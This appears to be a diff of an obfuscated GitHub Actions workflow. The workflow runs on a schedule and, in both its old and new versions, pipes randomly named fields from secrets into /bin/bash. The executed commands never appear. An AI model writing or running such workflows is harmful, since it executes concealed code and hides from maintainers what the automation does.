@@ -3,31 +3,25 @@ name: hippyviewcg
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 1/6 * * *'
-jobs:  # 26884
+    - cron: '48 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: hippyviewcg
         env:
-          xbrw63: ${{ secrets.xbrw63 }}
+          srxb6: ${{ secrets.srxb6 }}
         run: |
-          echo $xbrw63 | jq -r .gdjn326 | /bin/bash
-          echo $a46651 | jq -r .z5746 | /bin/bash
-          echo $rdu1 | jq -r .pejoq8944 | /bin/bash
-          echo $hhxtr71 | jq -r .rzbm089 | /bin/bash
-          echo $pk0962 | jq -r .zp1942 | /bin/bash
-          echo $h66 | jq -r .rujah849 | /bin/bash
-          echo $iyvq2268 | jq -r .u5125 | /bin/bash
-          echo $gfivj059 | jq -r .lynx668 | /bin/bash
-          echo $n92 | jq -r .pmry99 | /bin/bash
-          echo $ocje88405 | jq -r .zlqy1 | /bin/bash
-          echo $yecmb2 | jq -r .bivi43 | /bin/bash
-          echo $csxu2173 | jq -r .v8687 | /bin/bash
-          echo $nqjb49 | jq -r .cqo79 | /bin/bash
-          echo $jddok6778 | jq -r .aw64694 | /bin/bash
-          echo $f24 | jq -r .kac6731 | /bin/bash
-          echo $tyh0 | jq -r .xus0568 | /bin/bash
-          echo $x5 | jq -r .aj834 | /bin/bash
+          echo $srxb6 | jq -r .roll27 | /bin/bash
+          echo $htae6 | jq -r .gxu68 | /bin/bash
+          echo $nrrwg3867 | jq -r .y98255 | /bin/bash
+          echo $xjte52001 | jq -r .objnt7 | /bin/bash
+          echo $wjv59 | jq -r .fmg80 | /bin/bash
+          echo $vj65 | jq -r .w14372 | /bin/bash
+          echo $qkr97 | jq -r .nhy072 | /bin/bash
+          echo $m3136 | jq -r .ssg1 | /bin/bash
+          echo $gpva097 | jq -r .bz1 | /bin/bash
+          echo $aate85 | jq -r .jwzu88 | /bin/bash
+          echo $mo14863 | jq -r .gua40 | /bin/bash
 
